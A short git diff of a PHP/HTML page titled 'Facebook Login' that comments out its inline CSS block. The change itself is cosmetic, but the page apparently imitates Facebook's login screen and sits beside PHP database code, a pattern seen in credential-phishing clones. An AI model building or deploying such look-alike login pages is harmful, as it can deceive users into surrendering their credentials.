@@ -48,7 +48,7 @@ $conn->close();
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook Login</title>
     <link rel="stylesheet" href="styles.css">
-    <style>
+    <!-- <style>
         body {
     font-family: Arial, sans-serif;
     background-color: #f0f2f5;
@@ -135,7 +135,7 @@ button:hover {
     text-decoration: underline;
 }
 
-    </style>
+    </style> -->
 </head>
 <body>
     <div class="container">
